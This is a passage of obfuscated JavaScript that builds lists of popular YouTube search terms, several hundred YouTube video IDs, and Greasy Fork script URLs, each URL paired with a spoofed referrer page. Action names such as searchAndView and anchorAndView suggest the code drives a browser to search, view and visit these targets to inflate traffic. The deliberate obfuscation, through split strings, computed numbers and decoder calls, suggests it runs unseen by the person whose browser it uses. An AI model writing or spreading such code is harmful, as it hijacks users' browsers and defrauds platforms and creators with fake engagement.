'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x2684 + 0xa21 + -0x309b)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x2b * -0xae + 0x24c + 0x8 * 0x35f)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + X(0x10) + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0xff0 + 0x8 * -0xef + -0x875 * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    W(0x16, 'ZuRt') + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    X(0x13) + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + X(0xc) + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + W(0xa, '#7(v') + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + Y(0xf),
      'preRef': 'https://gr' + X(0xe) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
